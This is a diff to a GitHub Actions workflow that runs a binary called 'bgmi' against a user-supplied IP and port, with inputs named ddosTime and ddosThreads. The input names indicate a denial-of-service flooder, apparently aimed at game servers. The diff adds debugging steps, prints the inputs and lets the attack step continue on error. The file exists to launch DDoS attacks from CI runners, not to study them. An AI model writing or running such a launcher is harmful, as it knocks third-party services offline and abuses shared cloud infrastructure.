@@ -1,4 +1,3 @@
-# .github/workflows/execute-bgmi.yml
 name: Execute BGMI Script
 
 on:
@@ -29,8 +28,23 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v2
 
+    - name: Verify script location
+      run: ls -la
+
     - name: Make script executable
       run: chmod +x ./bgmi
 
-    - name: Run BGMI script
-      run: ./bgmi ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.ddosTime }} ${{ github.event.inputs.ddosThreads }}
+    - name: Verify script permissions
+      run: ls -la ./bgmi
+
+    - name: Print inputs
+      run: echo "IP: ${{ github.event.inputs.ip }}, Port: ${{ github.event.inputs.port }}, Time: ${{ github.event.inputs.ddosTime }}, Threads: ${{ github.event.inputs.ddosThreads }}"
+
+    - name: Run BGMI script with detailed output
+      run: |
+        set -x
+        ./bgmi ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.ddosTime }} ${{ github.event.inputs.ddosThreads }}
+      continue-on-error: true
+
+    - name: Capture script exit code
+      run: echo "Script exited with code $?"
